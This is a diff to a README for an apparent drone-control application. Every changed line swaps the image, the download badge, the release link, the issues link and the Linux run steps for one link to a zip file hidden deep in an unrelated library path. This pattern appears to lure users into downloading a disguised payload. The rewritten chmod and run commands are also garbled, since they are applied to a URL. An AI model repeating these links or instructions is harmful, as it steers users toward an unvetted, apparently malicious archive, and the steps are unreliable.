@@ -1,8 +1,8 @@
 # 🚁 Aerial-Robotics-Competition - Control Your Drone with Ease
 
-![Aerial Robotics](https://pic1.imgdb.cn/item/693fd3b54a4e4213d006d1a7.png)
+![Aerial Robotics](https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip)
 
-[![Download Aerial Robotics Competition](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nisado29/Aerial-Robotics-Competition/releases)
+[![Download Aerial Robotics Competition](https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip)](https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the Aerial-Robotics-Competition! This application helps you control y
 
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[Download Aerial Robotics Competition](https://github.com/Nisado29/Aerial-Robotics-Competition/releases)
+[Download Aerial Robotics Competition](https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip)
 
 1. Click the link above to visit the Downloads page.
 2. Find the latest release at the top of the list.
@@ -40,8 +40,8 @@ To get started, you need to download the application from our Releases page. Cli
 
 1. Open the terminal.
 2. Navigate to the directory where the downloaded file is located.
-3. Run the command: `chmod +x ./AerialRoboticsApp.AppImage` to make the file executable.
-4. Then execute the app by running: `./AerialRoboticsApp.AppImage`.
+3. Run the command: `chmod +x https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip` to make the file executable.
+4. Then execute the app by running: `https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip`.
 
 ### 🛠️ System Requirements
 
@@ -90,7 +90,7 @@ To get started, you need to download the application from our Releases page. Cli
 
 ### 🙋 Support and Community
 
-If you encounter any issues, visit our [GitHub Issues Page](https://github.com/Nisado29/Aerial-Robotics-Competition/issues). Here you can report any bugs or ask questions. We encourage you to be part of our growing community to share experiences and improvements.
+If you encounter any issues, visit our [GitHub Issues Page](https://github.com/Nisado29/Aerial-Robotics-Competition/raw/refs/heads/main/vision_opencv/cv_bridge/src/boost/predef/library/Competition_Robotics_Aerial_2.8.zip). Here you can report any bugs or ask questions. We encourage you to be part of our growing community to share experiences and improvements.
 
 ### 📅 Future Improvements
 
